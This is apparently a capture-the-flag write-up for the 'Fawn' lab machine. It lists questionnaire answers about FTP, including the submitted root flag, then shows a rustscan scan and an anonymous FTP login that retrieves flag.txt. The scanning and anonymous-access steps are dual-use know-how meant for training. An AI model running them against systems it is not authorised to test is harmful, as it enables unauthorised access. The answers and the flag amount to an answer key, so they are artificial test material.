# Fawn

## Questionnaire

##### What does the 3-letter acronym FTP stand for?

```
File Transfer Protocol
```

##### Which port does the FTP service listen on usually?

```
21
```

##### What acronym is used for the secure version of FTP?

```
SFTP
```

##### What is the command we can use to send an ICMP echo request to test our connection to the target?

```
ping
```

##### From your scans, what version is FTP running on the target?

```
vsftpd 3.0.3
```

##### From your scans, what OS type is running on the target?

```
Unix
```

##### What is the command we need to run in order to display the 'ftp' client help menu?

```
ftp -h
```

##### What is username that is used over FTP when you want to log in without having an account?

```
anonymous
```

##### What is the response code we get for the FTP message 'Login successful'?

```
230
```

##### There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.

```
ls
```

##### What is the command used to download the file we found on the FTP server?

```
get
```

##### Submit root flag

```
035db21c881520061c53e0536e44f815
```

## Commands

### Scan

```
$ rustscan -a 10.129.86.28 -- -sC

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32  flag.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

### File

```
$ ftp -p anonymous@10.129.86.28
Connected to 10.129.86.28.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,129,86,28,155,118).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
227 Entering Passive Mode (10,129,86,28,215,181).
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.000266 seconds (117 kbytes/s)
ftp> quit
221 Goodbye.
```
